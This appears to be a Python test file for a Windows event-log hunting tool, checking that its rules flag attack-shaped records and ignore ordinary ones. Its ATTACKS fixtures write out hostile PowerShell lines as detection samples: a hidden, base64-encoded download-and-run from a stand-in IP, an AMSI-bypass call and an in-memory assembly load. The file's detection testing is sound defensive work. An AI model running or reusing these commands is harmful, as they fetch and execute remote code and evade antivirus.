"""Looking through Windows' own records: the tests, the rules' wording, and - importantly - that ordinary things
on a normal computer are NOT called an attack. The benign examples below are real records from a working Windows
machine; if a change starts flagging them as known attacks, this test fails."""
import json
import os
import socket
import subprocess
import sys

import pytest

from zbtriage import huntwin as hw
from zbtriage.huntrules import HR_CHANNELS, HR_INFO, HR_KNOWN, HR_LOOK, HR_RULES
from zbtriage.iocs import Indicator, IocSet


@pytest.fixture(autouse=True)
def no_network(monkeypatch):
    def refuse(*a, **k):
        raise AssertionError("reading records must never touch the network")
    monkeypatch.setattr(socket, "create_connection", refuse)
    monkeypatch.setattr(socket, "getaddrinfo", refuse)


def event(channel="System", id=1, text="", when="2026-11-10T12:00:00", record=1, **data):
    return {"Id": id, "Time": when, "RecordId": record, "Provider": "p", "Data": dict(data), "Text": text}


# --- the matcher ---------------------------------------------------------------------------------------------

def test_tests():
    e = event(text="Hello World", Image="C:\\x\\powershell.exe", Empty="")
    assert hw.hw_test(e, ("Text", "has", "hello world"))
    assert hw.hw_test(e, ("Image", "ends", "POWERSHELL.EXE"))
    assert hw.hw_test(e, ("Image", "re", r"(?i)\\powershell\.exe$"))
    assert hw.hw_test(e, ("Empty", "empty")) and hw.hw_test(e, ("Missing", "empty"))
    assert not hw.hw_test(e, ("Text", "is", "hello"))
    with pytest.raises(hw.HwError):
        hw.hw_test(e, ("Text", "nonsense", "x"))


def test_field_lookup_is_forgiving_about_spelling_and_reads_everything():
    e = event(CommandLine="powershell -enc AAAA", id=1)
    assert hw.hw_test(e, ("commandline", "has", "-enc"))
    assert hw.hw_test(e, ("Text", "has", "-enc"))        # "Text" covers every field


def test_all_any_none_and_event_numbers():
    rule = {"ids": (4104,), "all": [("A", "is", "1")], "any": [("B", "has", "x"), ("B", "has", "y")],
            "none": [("C", "is", "safe")], "level": HR_LOOK, "says": "", "means": "", "where": "*"}
    assert hw.hw_match(event(id=4104, A="1", B="xx"), rule)
    assert not hw.hw_match(event(id=1, A="1", B="xx"), rule)          # wrong event number
    assert not hw.hw_match(event(id=4104, A="2", B="xx"), rule)       # "all" fails
    assert not hw.hw_match(event(id=4104, A="1", B="zz"), rule)       # no "any"
    assert not hw.hw_match(event(id=4104, A="1", B="xx", C="safe"), rule)


# --- what must be caught ------------------------------------------------------------------------------------

import base64  # noqa: E402

_HIDDEN = "powershell.exe -nop -w hidden -enc " + base64.b64encode(
    "IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.9/a.ps1')".encode("utf-16-le")).decode()

ATTACKS = [
    # the hidden command is decoded, so what it actually does is matched too
    ("Microsoft-Windows-PowerShell/Operational", 4104, _HIDDEN, ("ps-hidden-encoded", "ps-download-run")),
    ("Microsoft-Windows-PowerShell/Operational", 4104,
     "IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.9/a.ps1')", ("ps-download-run",)),
    ("Microsoft-Windows-PowerShell/Operational", 4104,
     "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')", ("ps-amsi",)),
    ("Microsoft-Windows-PowerShell/Operational", 4104,
     "$b=[System.Convert]::FromBase64String($x); [Reflection.Assembly]::Load($b)",
     ("ps-memory-load", "ps-hidden-encoded")),
    ("Microsoft-Windows-WMI-Activity/Operational", 5861, "ESS subscription created", ("wmi-persistence",)),
    ("System", 1102, "The audit log was cleared", ("log-cleared",)),
    ("Microsoft-Windows-Windows Defender/Operational", 5007,
     r"HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths\C:\Users\u\AppData = 0x0",
     ("defender-exclusion",)),
    ("System", 7045, r"Service File Name:  C:\Users\u\AppData\Local\Temp\agent.sys",
     ("service-installed", "service-user-path")),
]


@pytest.mark.parametrize("channel,event_id,text,expected", ATTACKS)
def test_attack_shapes_are_caught(channel, event_id, text, expected):
    found = {f["rule"] for f in hw.hw_check([event(id=event_id, text=text)], channel)}
    assert set(expected) <= found, "missed {}: got {}".format(set(expected) - found, found)


def test_document_starting_a_shell_is_known():
    e = event(id=1, ParentImage=r"C:\Program Files\Microsoft Office\WINWORD.EXE",
              Image=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe")
    found = [f for f in hw.hw_check([e], "Microsoft-Windows-Sysmon/Operational")
             if f["rule"] == "sysmon-rare-parent"]
    assert found and found[0]["level"] == HR_KNOWN


# --- what must NOT be called an attack (real records from a working computer) ---------------------------------

BENIGN = [
    ("Microsoft-Windows-Windows Defender/Operational", 5007,
     r"HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\TemporaryPaths\\?\D:\Games\x\voices38.dll = 0x486"),
    ("Microsoft-Windows-Windows Defender/Operational", 5007,
     r"HKLM\SOFTWARE\Microsoft\Windows Defender\Features\EcsConfigs\MpFC_Nis_WdFilterProcessExclusions = 0x1"),
    ("Microsoft-Windows-CodeIntegrity/Operational", 3033,
     r"Code Integrity determined that a process (\Device\HarddiskVolume3\Windows\UUS\amd64\WaaSMedicAgent.exe) "
     r"attempted to load \Device\HarddiskVolume3\Windows\System32\nvspcap64.dll that did not meet the "
     r"Microsoft signing level requirements"),
    ("System", 7040, "The start type of the Background Intelligent Transfer Service service was changed"),
    ("Microsoft-Windows-Bits-Client/Operational", 59,
     "BITS started the transfer job that is named 'Windows Update' with URL http://download.windowsupdate.com/x"),
    ("Microsoft-Windows-TaskScheduler/Operational", 106,
     r"User 'DESKTOP\user' registered Task Scheduler task '\OneDrive Reporting Task-S-1-5-21'"),
]


@pytest.mark.parametrize("channel,event_id,text", BENIGN)
def test_ordinary_records_are_never_called_an_attack(channel, event_id, text):
    for finding in hw.hw_check([event(id=event_id, text=text)], channel):
        assert finding["level"] != HR_KNOWN, "{} called {!r} an attack".format(finding["rule"], text[:60])


def test_a_normal_mix_of_records_is_not_a_known_threat():
    events = [event(id=i, text=t) for _c, i, t in BENIGN]
    result = hw.hw_report(hw.hw_check(events, "System") + hw.hw_check(events, "Microsoft-Windows-Bits-Client/"
                                                                      "Operational"), {"System": len(events)}, [])
    assert result["level"] in (hw.HW_NOTHING, hw.HW_LOOK)


# --- indicator lists ----------------------------------------------------------------------------------------

def test_an_indicator_in_a_record_is_a_known_threat():
    iocs = IocSet([Indicator("bad.example", "infrastructure", "primary", "domain", "amnesty-test", "Pegasus")],
                  "t", 0)
    found = hw.hw_check([event(id=4104, text="Invoke-WebRequest https://c2.bad.example/x")],
                        "Microsoft-Windows-PowerShell/Operational", iocs)
    hit = [f for f in found if f["rule"] == "indicator"]
    assert hit and hit[0]["level"] == HR_KNOWN and hit[0]["indicator"]["family"] == "Pegasus"
    assert hw.hw_report(found, {}, [])["level"] == hw.HW_KNOWN


# --- grouping and words -------------------------------------------------------------------------------------

def test_many_of_the_same_thing_become_one_group_with_a_count():
    events = [event(id=4104, text="powershell -w hidden -enc " + "A" * 40, record=i, when="2026-11-0{}T00:00:00"
                    .format(i + 1)) for i in range(8)]
    result = hw.hw_report(hw.hw_check(events, "Microsoft-Windows-PowerShell/Operational"), {"x": 8}, [])
    groups = [g for g in result["groups"] if g["rule"] == "ps-hidden-encoded"]
    assert len(groups) == 1 and groups[0]["count"] == 8 and len(groups[0]["examples"]) == 3
    text = hw.hw_render(result)
    assert "8 times" in text and "what it means:" in text


def test_context_findings_are_held_back_until_asked_for():
    events = [event(id=7040, text="start type changed")]
    result = hw.hw_report(hw.hw_check(events, "System"), {"System": 1}, [])
    assert "FOR CONTEXT (add --all" in hw.hw_render(result)
    assert "what it means:" in hw.hw_render(result, show_context=True)


def test_report_says_what_was_not_read():
    result = hw.hw_report([], {}, ["Security: needs administrator rights"])
    text = hw.hw_render(result)
    assert "NOT READ" in text and "administrator" in text and "nothing was contacted" in text
    assert "not proof that nothing happened" in text


def test_every_rule_is_well_formed_and_explains_itself():
    ids = set()
    channels = {c for c, _a in HR_CHANNELS} | {"*"}
    for rule in HR_RULES:
        assert rule["id"] not in ids, "two rules share the id " + rule["id"]
        ids.add(rule["id"])
        assert rule["where"] in channels, rule["id"] + " names a channel that is never collected"
        assert rule["level"] in (HR_KNOWN, HR_LOOK, HR_INFO)
        assert len(rule["says"]) > 15 and len(rule["means"]) > 40, rule["id"] + " does not explain itself"
        assert not rule["says"].endswith("."), rule["id"] + ": 'says' is a phrase, not a sentence"
        for key in ("all", "any", "none"):
            for condition in rule.get(key, ()):
                assert len(condition) in (2, 3) and isinstance(condition[0], str)
                if condition[1] == "re":
                    import re
                    re.compile(condition[2])


# --- reading from files and from this computer ----------------------------------------------------------------

def test_files_are_read_with_the_native_reader(tmp_path, monkeypatch):
    fake = tmp_path / "exported.evtx"
    fake.write_bytes(b"x")
    monkeypatch.setattr("zbtriage.evtxread.ev_events",
                        lambda path, limit=None: [event(id=1102, text="The audit log was cleared",
                                                        record=7)])
    result = hw.hw_from_files([str(fake)], None)
    assert result["level"] == hw.HW_KNOWN and result["events"] == 1
    assert any(g["rule"] == "log-cleared" for g in result["groups"])


def test_a_missing_file_is_reported_not_crashed(tmp_path):
    result = hw.hw_from_files([str(tmp_path / "nope.evtx")], None)
    assert result["gaps"] and "not found" in result["gaps"][0]


def test_live_channel_reads_what_windows_hands_back(monkeypatch):
    rows = [{"Id": 4104, "Time": "2026-11-10T10:00:00", "RecordId": 5, "Provider": "PS",
             "Data": {"ScriptBlockText": "x"}, "Text": "x"}]
    monkeypatch.setattr(hw, "hw_powershell", lambda script, timeout=0: (0, json.dumps(rows)))
    monkeypatch.setattr(sys, "platform", "win32")
    events, why = hw.hw_live_channel("Windows PowerShell", {4104})
    assert why == "" and events[0]["Id"] == 4104 and events[0]["Data"]["ScriptBlockText"] == "x"


def test_live_channel_explains_why_it_could_not_read(monkeypatch):
    monkeypatch.setattr(sys, "platform", "win32")
    monkeypatch.setattr(hw, "hw_powershell", lambda s, timeout=0: (1, "Attempted to perform an unauthorized "
                                                                   "operation."))
    assert hw.hw_live_channel("Security", {4624})[1] == "needs administrator rights"
    monkeypatch.setattr(hw, "hw_powershell", lambda s, timeout=0: (1, "There is not an event log on this computer"))
    assert "does not exist" in hw.hw_live_channel("Nope", {1})[1]
    monkeypatch.setattr(hw, "hw_powershell", lambda s, timeout=0: (0, "[]"))
    assert hw.hw_live_channel("Windows PowerShell", {400}) == ([], "")


def test_security_log_is_skipped_unless_asked_for(monkeypatch):
    monkeypatch.setattr(sys, "platform", "win32")
    monkeypatch.setattr(hw, "hw_live_channel", lambda channel, ids, limit=0: ([], ""))
    result = hw.hw_from_this_computer(None)
    assert any(g.startswith("Security:") and "administrator" in g for g in result["gaps"])


@pytest.mark.skipif(sys.platform != "win32", reason="reads this computer's own records")
def test_this_computer_can_be_read_for_real():
    events, why = hw.hw_live_channel("Microsoft-Windows-WMI-Activity/Operational", {5857, 5858, 5861}, limit=50)
    if why:
        pytest.skip("this computer has no readable WMI log: " + why)
    assert events and all(e["Time"] for e in events)
    findings = hw.hw_check(events, "Microsoft-Windows-WMI-Activity/Operational")
    assert all(f["means"] for f in findings)


# --- entry points --------------------------------------------------------------------------------------------
from test_followup_fixes import bundle  # noqa: E402,F401  (pytest fixture)


def test_bundle_reads_a_log_file_not_the_computer(bundle, capsys, monkeypatch, tmp_path):
    monkeypatch.setattr(bundle, "reader_run", lambda *a, **k: pytest.fail("a computer scan must not start"),
                        raising=False)
    monkeypatch.setattr(bundle, "hw_from_this_computer",
                        lambda *a, **k: pytest.fail("a file was given, not this computer"), raising=False)
    monkeypatch.setattr(bundle, "ev_events", lambda path, limit=None: [], raising=False)
    f = tmp_path / "x.evtx"
    f.write_bytes(b"x")
    assert bundle._bundle_main(["--no-menu", "--no-banner", "--no-feeds", "--hunt-windows", str(f)]) == 0
    assert "WINDOWS' OWN RECORDS" in capsys.readouterr().out


def test_hidden_commands_are_decoded_and_junk_is_left_alone():
    real = base64.b64encode("Get-Process".encode("utf-16-le")).decode()
    assert "Get-Process" in hw.hw_decoded("powershell -EncodedCommand " + real)
    assert hw.hw_decoded("-enc " + "A" * 40) == ""           # not text: nothing is invented
    assert hw.hw_decoded("") == "" and hw.hw_decoded("nothing here") == ""


def test_the_decoded_command_is_shown_in_the_report():
    result = hw.hw_report(hw.hw_check([event(id=4104, text=_HIDDEN)],
                                      "Microsoft-Windows-PowerShell/Operational"), {"x": 1}, [])
    assert "the hidden command actually says" in hw.hw_render(result)
    assert "DownloadString" in hw.hw_render(result)
